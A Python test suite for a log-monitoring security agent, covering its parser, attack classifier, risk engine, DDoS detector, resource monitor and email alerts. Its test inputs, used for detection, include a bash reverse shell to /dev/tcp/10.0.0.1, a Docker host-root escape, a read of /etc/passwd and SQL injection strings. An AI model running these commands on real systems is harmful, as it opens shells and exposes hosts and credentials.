"""
test_global.py
==============
Comprehensive Global Test Suite for the complete AI SOC Security Agent.
Tests ALL modules and functionalities:

  1. Configuration & Environment
  2. Database (all 6 tables)
  3. Log Parser & Noise Filter
  4. AI Predictor (48 attack categories)
  5. Risk Engine (5 tier severity)
  6. DDoS Traffic Detector
  7. Resource Monitor
  8. Alert Manager (cooldown, dedup, recovery)
  9. Email Service
 10. Health Check Diagnostics

At the end, generates a formatted Test Report.
"""

import sys
import os
import time
import json
from datetime import datetime

sys.path.insert(0, os.getcwd())

# Patch cooldown to 0 so email tests always trigger
import app.config as config
config.ALERT_COOLDOWN_SECONDS = 0

# ────────────────────────────────────────────
# Test Result Tracker
# ────────────────────────────────────────────
class TestReport:
    def __init__(self):
        self.start_time = time.time()
        self.results = []

    def record(self, module: str, test_name: str, passed: bool, detail: str = ""):
        self.results.append({
            "module": module,
            "test": test_name,
            "status": "✅ PASS" if passed else "❌ FAIL",
            "detail": detail,
            "passed": passed
        })
        status = "✅ PASS" if passed else "❌ FAIL"
        print(f"  {status}  {test_name}")
        if detail:
            print(f"         ↳ {detail}")

    def summary(self):
        total = len(self.results)
        passed = sum(1 for r in self.results if r["passed"])
        failed = total - passed
        elapsed = round(time.time() - self.start_time, 2)
        return total, passed, failed, elapsed


report = TestReport()

print("=" * 70)
print("🛡️  AI SOC AGENT — GLOBAL TEST SUITE")
print(f"    Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("=" * 70)


# ══════════════════════════════════════════════════════════════════════
# MODULE 1: CONFIGURATION
# ══════════════════════════════════════════════════════════════════════
print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("📋 MODULE 1: Configuration & Environment")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

try:
    assert config.HOSTNAME not in (None, ""), "HOSTNAME not set"
    report.record("Config", "HOSTNAME defined", True, f"hostname = '{config.HOSTNAME}'")
except Exception as e:
    report.record("Config", "HOSTNAME defined", False, str(e))

try:
    assert config.MODEL_DIR and os.path.exists(config.MODEL_DIR), "MODEL_DIR missing"
    report.record("Config", "MODEL_DIR exists", True, config.MODEL_DIR)
except Exception as e:
    report.record("Config", "MODEL_DIR exists", False, str(e))

try:
    assert config.DB_PATH.endswith(".db"), "DB_PATH should be .db file"
    report.record("Config", "DB_PATH configured", True, config.DB_PATH)
except Exception as e:
    report.record("Config", "DB_PATH configured", False, str(e))

try:
    assert config.SMTP_HOST and config.SMTP_USER and config.ADMIN_EMAIL
    report.record("Config", "SMTP settings configured", True,
                  f"host={config.SMTP_HOST}:{config.SMTP_PORT} user={config.SMTP_USER}")
except Exception as e:
    report.record("Config", "SMTP settings configured", False, str(e))

try:
    assert config.DDOS_REQUEST_THRESHOLD > 0
    assert config.CPU_CRITICAL > config.CPU_WARNING
    assert config.RAM_CRITICAL > config.RAM_WARNING
    report.record("Config", "DDoS & Resource thresholds valid", True,
                  f"DDoS threshold={config.DDOS_REQUEST_THRESHOLD} | CPU: {config.CPU_WARNING}/{config.CPU_CRITICAL}%")
except Exception as e:
    report.record("Config", "DDoS & Resource thresholds valid", False, str(e))


# ══════════════════════════════════════════════════════════════════════
# MODULE 2: DATABASE
# ══════════════════════════════════════════════════════════════════════
print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("🗄️  MODULE 2: SQLite Database (6 Tables)")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

try:
    from app.database import db
    report.record("Database", "Database initialized & connected", True, config.DB_PATH)
except Exception as e:
    report.record("Database", "Database initialized & connected", False, str(e))

try:
    import sqlite3
    conn = sqlite3.connect(config.DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = [row[0] for row in cursor.fetchall()]
    conn.close()
    expected = ["attack_logs", "alerts", "security_events", "resource_alerts", "ddos_events", "system_health"]
    missing = [t for t in expected if t not in tables]
    assert not missing, f"Missing tables: {missing}"
    report.record("Database", f"All 6 tables exist ({', '.join(expected)})", True)
except Exception as e:
    report.record("Database", "All 6 tables exist", False, str(e))

try:
    attack_id = db.save_attack(
        hostname="TEST-HOST",
        source_log="/var/log/test.log",
        raw_log="test: ssh brute force from 1.2.3.4",
        clean_text="Failed password for root from 1.2.3.4",
        prediction="SSH_BruteForce",
        confidence=0.97,
        risk="HIGH",
        status="test"
    )
    assert attack_id > 0
    report.record("Database", "save_attack() writes to attack_logs", True, f"Incident ID #{attack_id}")
except Exception as e:
    report.record("Database", "save_attack() writes to attack_logs", False, str(e))

try:
    alert_id = db.save_alert(
        hostname="TEST-HOST",
        alert_type="TEST_ALERT",
        severity="HIGH",
        description="Global test alert",
        source="test_global.py",
        metrics={"test": True}
    )
    assert alert_id > 0
    report.record("Database", "save_alert() writes to alerts table", True, f"Alert ID #{alert_id}")
except Exception as e:
    report.record("Database", "save_alert() writes to alerts table", False, str(e))

try:
    ddos_id = db.save_ddos_event(
        hostname="TEST-HOST",
        pattern_type="Single IP Flood",
        requests_count=115,
        window_seconds=10,
        top_ip="185.220.101.42",
        top_endpoint="/login",
        risk_level="CRITICAL",
        metrics={"total": 115}
    )
    assert ddos_id > 0
    report.record("Database", "save_ddos_event() writes to ddos_events table", True, f"DDoS Event ID #{ddos_id}")
except Exception as e:
    report.record("Database", "save_ddos_event() writes to ddos_events table", False, str(e))

try:
    stats = db.statistics()
    assert "total_incidents" in stats
    assert "risk_breakdown" in stats
    report.record("Database", "statistics() returns aggregated metrics", True,
                  f"Total incidents={stats['total_incidents']} | DDoS events={stats['total_ddos_events']}")
except Exception as e:
    report.record("Database", "statistics() returns aggregated metrics", False, str(e))


# ══════════════════════════════════════════════════════════════════════
# MODULE 3: LOG PARSER
# ══════════════════════════════════════════════════════════════════════
print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("📝 MODULE 3: Log Parser & Noise Filter")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

try:
    from app.log_parser import log_parser

    ssh_line = "Aug 10 12:00:00 server sshd[9999]: Failed password for root from 185.220.101.42 port 54321 ssh2"
    result = log_parser.extract_clean_text(ssh_line, source_log="/var/log/auth.log")
    assert result and len(result) > 5
    report.record("LogParser", "SSH auth log line extracted", True, f"Clean: '{result[:60]}...'")
except Exception as e:
    report.record("LogParser", "SSH auth log line extracted", False, str(e))

try:
    noise_line = "systemd[1]: Started Session 42 of user root."
    result = log_parser.extract_clean_text(noise_line, source_log="/var/log/syslog")
    # Noise lines should return None/empty (filtered out)
    report.record("LogParser", "Noise/systemd log filtered out", result is None or result == "",
                  f"Result: '{result}'")
except Exception as e:
    report.record("LogParser", "Noise/systemd log filtered out", False, str(e))

try:
    cmd_line = "Aug 10 13:00:00 server bash[1234]: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    result = log_parser.extract_clean_text(cmd_line, source_log="/var/log/syslog")
    assert result and len(result) > 5
    report.record("LogParser", "Reverse shell command log extracted", True, f"Clean: '{result[:60]}'")
except Exception as e:
    report.record("LogParser", "Reverse shell command log extracted", False, str(e))


# ══════════════════════════════════════════════════════════════════════
# MODULE 4: AI PREDICTOR (48 ATTACK CATEGORIES)
# ══════════════════════════════════════════════════════════════════════
print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("🤖 MODULE 4: AI Predictor — DistilBERT 48-Class Model")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

try:
    from app.predictor import predictor
    assert predictor.is_loaded, "Model not loaded!"
    report.record("Predictor", f"DistilBERT model loaded ({len(predictor.id2label)} classes)", True,
                  f"Classes: {len(predictor.id2label)} | Device: CPU")
except Exception as e:
    report.record("Predictor", "DistilBERT model loaded", False, str(e))

# Test key attack categories
attack_tests = [
    ("Failed password for root from 185.220.101.42 port 54321 ssh2", "SSH_BruteForce"),
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "ReverseShell"),
    ("docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "Docker_Abuse"),
    ("SELECT * FROM users WHERE id=1 OR 1=1", "SQL_Injection"),
    ("cat /etc/passwd && id && whoami", "Linux_Command_Injection"),
    ("Hello, how are you today? This is a normal server log.", "Benign"),
]

for text, expected_family in attack_tests:
    try:
        prediction, confidence, top3 = predictor.predict(text)
        passed = confidence > 0.40
        report.record("Predictor",
                      f"Classify: '{text[:40]}...'",
                      passed,
                      f"→ [{prediction}] conf={confidence*100:.1f}% (expected family: {expected_family})")
    except Exception as e:
        report.record("Predictor", f"Classify: '{text[:40]}...'", False, str(e))


# ══════════════════════════════════════════════════════════════════════
# MODULE 5: RISK ENGINE
# ══════════════════════════════════════════════════════════════════════
print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("⚡ MODULE 5: Risk Engine (5-Tier Severity)")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

from app.risk_engine import risk_engine

risk_tests = [
    ("Benign",              0.95, "SAFE"),
    ("SSH_BruteForce",      0.92, "HIGH"),
    ("ReverseShell",        0.98, "CRITICAL"),
    ("PortScanning",        0.80, "MEDIUM"),
    ("ReverseShell",        0.30, "SAFE"),  # Low confidence (<70%) → forced to SAFE (false positive fix)
]
for pred, conf, expected in risk_tests:
    try:
        result = risk_engine.calculate_risk(pred, conf)
        passed = result == expected
        report.record("RiskEngine",
                      f"calculate_risk({pred}, {conf})",
                      passed,
                      f"→ [{result}] | Expected: [{expected}]")
    except Exception as e:
        report.record("RiskEngine", f"calculate_risk({pred}, {conf})", False, str(e))


# ══════════════════════════════════════════════════════════════════════
# MODULE 6: DDOS DETECTOR
# ══════════════════════════════════════════════════════════════════════
print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("🌊 MODULE 6: DDoS Traffic Anomaly Detector")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

from app.ddos_detector import DDoSDetector

try:
    d = DDoSDetector(enabled=True, window_seconds=5, request_threshold=20, ip_threshold=10, endpoint_threshold=15)
    r = d.record_request("192.168.1.1", "/home", "GET", 200)
    assert r["risk_level"] == "NORMAL"
    report.record("DDoS", "Normal baseline traffic → NORMAL", True, f"RPS={r['requests_per_second']}")
except Exception as e:
    report.record("DDoS", "Normal baseline traffic → NORMAL", False, str(e))

try:
    d = DDoSDetector(enabled=True, window_seconds=5, request_threshold=20, ip_threshold=10, endpoint_threshold=15)
    for _ in range(13):
        r = d.record_request("10.10.10.1", "/login", "POST", 200)
    assert r["risk_level"] in ("HIGH", "CRITICAL")
    assert "Single IP Flood" in str(r["patterns_detected"])
    report.record("DDoS", "Single IP flood (13 reqs) → HIGH/CRITICAL", True,
                  f"risk={r['risk_level']} | {r['patterns_detected']}")
except Exception as e:
    report.record("DDoS", "Single IP flood (13 reqs) → HIGH/CRITICAL", False, str(e))

try:
    d = DDoSDetector(enabled=True, window_seconds=5, request_threshold=20, ip_threshold=10, endpoint_threshold=15)
    for i in range(22):
        r = d.record_request(f"203.0.113.{i+1}", "/api", "GET", 200)
    assert r["risk_level"] == "CRITICAL"
    assert r["unique_ips_count"] >= 20
    report.record("DDoS", "Distributed DDoS (22 IPs) → CRITICAL", True,
                  f"unique_ips={r['unique_ips_count']} risk={r['risk_level']}")
except Exception as e:
    report.record("DDoS", "Distributed DDoS (22 IPs) → CRITICAL", False, str(e))

try:
    d = DDoSDetector(enabled=True, window_seconds=5, request_threshold=20, ip_threshold=50, endpoint_threshold=10)
    for i in range(12):
        r = d.record_request(f"192.168.1.{i+1}", "/checkout", "POST", 200)
    assert "Targeted Endpoint Flood" in str(r["patterns_detected"])
    report.record("DDoS", "Targeted endpoint flood (/checkout) detected", True,
                  f"top_endpoint={r['top_endpoint']} reqs={r['top_endpoint_requests']}")
except Exception as e:
    report.record("DDoS", "Targeted endpoint flood (/checkout) detected", False, str(e))

try:
    d = DDoSDetector()
    raw = '185.220.101.45 - - [10/Aug/2026:13:00:00 +0000] "POST /login HTTP/1.1" 401 256'
    parsed = d.parse_web_log(raw)
    assert parsed is not None
    ip, endpoint, method, status = parsed
    assert ip == "185.220.101.45" and endpoint == "/login" and status == 401
    report.record("DDoS", "Nginx access log line parsed correctly", True,
                  f"IP={ip}, endpoint={endpoint}, method={method}, status={status}")
except Exception as e:
    report.record("DDoS", "Nginx access log line parsed correctly", False, str(e))


# ══════════════════════════════════════════════════════════════════════
# MODULE 7: RESOURCE MONITOR
# ══════════════════════════════════════════════════════════════════════
print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("🖥️  MODULE 7: VPS Resource Monitor")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

from app.resource_monitor import ResourceMonitor

try:
    rm = ResourceMonitor()
    res = rm.check_resources()
    m = res["metrics"]
    assert "cpu_percent" in m and "ram_percent" in m and "disk_percent" in m
    report.record("ResourceMonitor", "Hardware metrics polled (CPU/RAM/Disk)", True,
                  f"CPU={m['cpu_percent']}% | RAM={m['ram_percent']}% | Disk={m['disk_percent']}%")
except Exception as e:
    report.record("ResourceMonitor", "Hardware metrics polled (CPU/RAM/Disk)", False, str(e))

try:
    rm = ResourceMonitor()
    assert rm.evaluate_metric_state(30.0, 80.0, 95.0) == "NORMAL"
    assert rm.evaluate_metric_state(85.0, 80.0, 95.0) == "WARNING"
    assert rm.evaluate_metric_state(97.0, 80.0, 95.0) == "CRITICAL"
    report.record("ResourceMonitor", "Threshold evaluation logic (NORMAL/WARNING/CRITICAL)", True)
except Exception as e:
    report.record("ResourceMonitor", "Threshold evaluation logic (NORMAL/WARNING/CRITICAL)", False, str(e))

try:
    rm = ResourceMonitor()
    rm.last_states = {"CPU": "NORMAL", "RAM": "NORMAL", "DISK": "NORMAL"}
    res = rm.check_resources()
    assert "transitions" in res
    report.record("ResourceMonitor", "State transition detection works", True,
                  f"transitions detected: {len(res['transitions'])}")
except Exception as e:
    report.record("ResourceMonitor", "State transition detection works", False, str(e))


# ══════════════════════════════════════════════════════════════════════
# MODULE 8: ALERT MANAGER
# ══════════════════════════════════════════════════════════════════════
print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("🔔 MODULE 8: Central Alert Manager")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

from app.alert_manager import AlertManager

try:
    am = AlertManager(cooldown_seconds=0)
    assert not am._is_in_cooldown("TEST", "key1")  # First call → not in cooldown
    # Reconfigure with longer cooldown
    am2 = AlertManager(cooldown_seconds=60)
    am2._is_in_cooldown("TEST", "key2")
    assert am2._is_in_cooldown("TEST", "key2")  # Second call → in cooldown
    report.record("AlertManager", "Cooldown suppression logic works", True,
                  f"cooldown={am2.cooldown_seconds}s")
except Exception as e:
    report.record("AlertManager", "Cooldown suppression logic works", False, str(e))

try:
    am = AlertManager(cooldown_seconds=0)
    sent = am.dispatch_security_attack(
        prediction="ReverseShell",
        confidence=0.97,
        risk="CRITICAL",
        source_log=f"/var/log/global_test_{int(time.time())}.log",
        raw_log="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    )
    report.record("AlertManager", "dispatch_security_attack() → email sent",
                  sent, f"Sent={sent} to {config.ADMIN_EMAIL}")
except Exception as e:
    report.record("AlertManager", "dispatch_security_attack() → email sent", False, str(e))

try:
    am = AlertManager(cooldown_seconds=0)
    ddos_payload = {
        "risk_level": "CRITICAL",
        "total_requests_in_window": 115,
        "window_seconds": 10,
        "requests_per_second": 11.5,
        "unique_ips_count": 1,
        "top_ip": "185.220.101.42",
        "top_endpoint": "/login",
        "top_endpoint_requests": 115,
        "patterns_detected": ["Single IP Flood (185.220.101.42 sent 115 req/10s)"],
        "is_anomaly": True
    }
    sent = am.dispatch_ddos_alert(ddos_payload)
    report.record("AlertManager", "dispatch_ddos_alert() → email sent",
                  sent, f"Sent={sent} to {config.ADMIN_EMAIL}")
except Exception as e:
    report.record("AlertManager", "dispatch_ddos_alert() → email sent", False, str(e))

try:
    am = AlertManager(cooldown_seconds=0)
    metrics = {"cpu_percent": 97.5, "ram_percent": 92.0, "disk_percent": 96.0}
    sent = am.dispatch_resource_alert(
        metric_name="CPU",
        severity="CRITICAL",
        alert_type_name="CPU_CRITICAL",
        current_val=97.5,
        threshold_val=95.0,
        metrics=metrics
    )
    report.record("AlertManager", "dispatch_resource_alert(CPU_CRITICAL) → email sent",
                  sent, f"Sent={sent} to {config.ADMIN_EMAIL}")
except Exception as e:
    report.record("AlertManager", "dispatch_resource_alert(CPU_CRITICAL) → email sent", False, str(e))

try:
    am = AlertManager(cooldown_seconds=0)
    am.active_resource_states["CPU"] = "CRITICAL"
    sent = am.dispatch_recovery_alert(
        metric_name="CPU",
        current_val=22.5,
        metrics={"cpu_percent": 22.5, "ram_percent": 38.0, "disk_percent": 45.0}
    )
    report.record("AlertManager", "dispatch_recovery_alert(CPU) → email sent",
                  sent, f"Sent={sent} to {config.ADMIN_EMAIL}")
except Exception as e:
    report.record("AlertManager", "dispatch_recovery_alert(CPU) → email sent", False, str(e))


# ══════════════════════════════════════════════════════════════════════
# MODULE 9: EMAIL SERVICE
# ══════════════════════════════════════════════════════════════════════
print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("📧 MODULE 9: Email Service & SMTP")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

try:
    from app.email_service import EmailService
    es = EmailService()
    # Anti-spam dedup check
    es._dedup_cache = {}  # clear cache
    config.ALERT_COOLDOWN_SECONDS = 0
    sent = es.send_alert(
        hostname=config.HOSTNAME,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        prediction="SQL_Injection",
        confidence=0.94,
        risk="HIGH",
        source_log=f"/var/log/nginx/access_test_{int(time.time())}.log",
        raw_log="GET /search?q=1'+OR+'1'='1 HTTP/1.1"
    )
    report.record("EmailService", "send_alert() for SQL_Injection HIGH threat", sent,
                  f"Sent={sent} to {config.ADMIN_EMAIL}")
except Exception as e:
    report.record("EmailService", "send_alert() for SQL_Injection HIGH threat", False, str(e))

try:
    es = EmailService()
    es._dedup_cache = {}
    sent = es.send_alert_event(
        alert_type="RAM_CRITICAL",
        severity="CRITICAL",
        hostname=config.HOSTNAME,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        description="RAM usage reached 93.5% (Threshold: 90.0%)",
        metrics={"ram_percent": 93.5, "cpu_percent": 55.0},
        source="ResourceMonitor (RAM)",
        recommendation="Inspect high memory processes using 'ps aux --sort=-%mem | head -20'"
    )
    report.record("EmailService", "send_alert_event() for RAM_CRITICAL threat", sent,
                  f"Sent={sent} to {config.ADMIN_EMAIL}")
except Exception as e:
    report.record("EmailService", "send_alert_event() for RAM_CRITICAL threat", False, str(e))


# ══════════════════════════════════════════════════════════════════════
# MODULE 10: HEALTH CHECK
# ══════════════════════════════════════════════════════════════════════
print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("❤️  MODULE 10: Health Check Diagnostics")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

try:
    from app.health import health_checker
    simple = health_checker.get_simple_health()
    required_keys = ["status", "agent", "model", "database", "log_monitor",
                     "last_heartbeat", "hostname", "uptime", "cpu", "ram", "disk"]
    missing_keys = [k for k in required_keys if k not in simple]
    assert not missing_keys
    report.record("Health", "GET /health → all required fields present", True,
                  f"status={simple['status']} | model={simple['model']} | uptime={simple['uptime']}s")
except Exception as e:
    report.record("Health", "GET /health → all required fields present", False, str(e))

try:
    full = health_checker.get_full_diagnostics()
    assert "status" in full and "summary" in full and "system" in full
    report.record("Health", "GET /api/v1/health → full diagnostics response", True,
                  f"status={full['status']} | SMTP connected={full['smtp']['connected']}")
except Exception as e:
    report.record("Health", "GET /api/v1/health → full diagnostics response", False, str(e))

try:
    old_hb = health_checker.last_heartbeat
    health_checker.update_heartbeat()
    assert health_checker.last_heartbeat is not None
    uptime = health_checker.get_uptime_seconds()
    assert uptime >= 0
    report.record("Health", "Heartbeat update & uptime calculation", True,
                  f"last_heartbeat={health_checker.last_heartbeat} | uptime={uptime}s")
except Exception as e:
    report.record("Health", "Heartbeat update & uptime calculation", False, str(e))


# ══════════════════════════════════════════════════════════════════════
# FINAL REPORT
# ══════════════════════════════════════════════════════════════════════
total, passed, failed, elapsed = report.summary()

print("\n")
print("=" * 70)
print("📊  GLOBAL TEST REPORT — AI SOC SECURITY AGENT")
print(f"    Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("=" * 70)

# Summary table
modules = {}
for r in report.results:
    if r["module"] not in modules:
        modules[r["module"]] = {"pass": 0, "fail": 0}
    if r["passed"]:
        modules[r["module"]]["pass"] += 1
    else:
        modules[r["module"]]["fail"] += 1

print(f"\n{'Module':<22} {'Tests':>6} {'✅ Pass':>8} {'❌ Fail':>8}  Status")
print("-" * 58)
for mod, counts in modules.items():
    total_mod = counts["pass"] + counts["fail"]
    status = "✅ ALL PASS" if counts["fail"] == 0 else f"❌ {counts['fail']} FAILED"
    print(f"  {mod:<20} {total_mod:>6} {counts['pass']:>8} {counts['fail']:>8}  {status}")

print("-" * 58)
print(f"  {'TOTAL':<20} {total:>6} {passed:>8} {failed:>8}")
print()
print(f"  ⏱️  Execution Time : {elapsed}s")
print(f"  🎯 Success Rate   : {round(passed/total*100, 1)}%  ({passed}/{total} tests passed)")
print()

if failed == 0:
    print("  🏆 RESULT: ✅ ALL TESTS PASSED — AI SOC AGENT IS FULLY OPERATIONAL")
elif failed <= 2:
    print(f"  ⚠️  RESULT: {failed} MINOR ISSUE(S) — AI SOC AGENT IS MOSTLY OPERATIONAL")
else:
    print(f"  🚨 RESULT: {failed} FAILURES DETECTED — REVIEW FAILED MODULES ABOVE")

print("=" * 70)

# Failed tests detail
if failed > 0:
    print("\n📋 FAILED TESTS DETAIL:")
    for r in report.results:
        if not r["passed"]:
            print(f"   ❌ [{r['module']}] {r['test']}")
            print(f"      ↳ {r['detail']}")
    print()
